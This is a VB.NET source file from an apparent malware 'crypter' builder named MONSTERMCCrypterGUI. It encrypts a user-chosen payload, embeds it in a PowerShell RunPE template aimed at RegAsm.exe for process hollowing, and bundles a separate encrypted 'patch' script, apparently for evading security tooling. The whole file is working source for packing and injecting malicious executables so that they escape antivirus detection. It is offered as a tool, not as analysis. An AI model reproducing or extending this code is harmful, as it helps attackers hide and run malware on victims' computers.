Imports System
Imports System.IO
Imports System.Text
Imports MONSTERMC.MONSTERMCCrypterGUI.Forms.SubForms
Imports MONSTERMC.MONSTERMCCrypterGUI.Forms.mdiProperties

Namespace MONSTERMCCrypterGUI.Randomize
    Friend Class Randomize
        Public Shared Function RandomIvKey(ByVal sizeinb As Integer) As Byte()
            Dim random As Random = New Random()
            Dim b = New Byte(sizeinb - 1) {}
            random.NextBytes(b)
            Return b
        End Function

        Public Shared Function SourceEncrypt() As Tuple(Of String, String, String, String, Byte(), String, String)
            Return Tuple.Create(Convert.ToBase64String(Encrypt.Encrypt.Encryptor(Encoding.UTF8.GetBytes(Files.RunPe), Convert.FromBase64String(File.ReadAllText("Key.txt")), Convert.FromBase64String(File.ReadAllText("Iv.txt")))), Convert.ToBase64String(Encrypt.Encrypt.Encryptor(Encoding.UTF8.GetBytes(Files.Patch), Convert.FromBase64String(File.ReadAllText("Key.txt")), Convert.FromBase64String(File.ReadAllText("Iv.txt")))), Convert.ToBase64String(Powershell.Encryption.EncryptStringToBytes(Files.PowershellPatch, Convert.FromBase64String(File.ReadAllText("PowershellKey.txt")), Convert.FromBase64String(File.ReadAllText("PowershellIv.txt")))), Convert.ToBase64String(Powershell.Encryption.EncryptStringToBytes(Files.PowershellRunPe.Replace("%PATH%", "C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe").Replace("%PAYLOADHERE%", Convert.ToBase64String(Encrypt.Encrypt.Encryptor(File.ReadAllBytes(Forms.SubForms.Path.FilePath), Convert.FromBase64String(File.ReadAllText("Key.txt")), Convert.FromBase64String(File.ReadAllText("Iv.txt"))))).Replace("%KEYHERE%", File.ReadAllText("Key.txt")).Replace("%IVHERE%", File.ReadAllText("Iv.txt")), Convert.FromBase64String(File.ReadAllText("PowershellKey.txt")), Convert.FromBase64String(File.ReadAllText("PowershellIv.txt")))), Encrypt.Encrypt.Encryptor(File.ReadAllBytes(Forms.SubForms.Path.FilePath), Convert.FromBase64String(File.ReadAllText("Key.txt")), Convert.FromBase64String(File.ReadAllText("Iv.txt"))), File.ReadAllText("Key.txt"), File.ReadAllText("Iv.txt"))
        End Function

        Public Shared Function RunPe() As String
            Dim sb As StringBuilder = New StringBuilder()
            sb.Append(Files.PowershellRunPe)
            sb.Replace("%PATH%", "C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe")
            sb.Replace("%PAYLOADHERE%", Convert.ToBase64String(SourceEncrypt().Item5))
            Return sb.ToString()
        End Function
    End Class
End Namespace
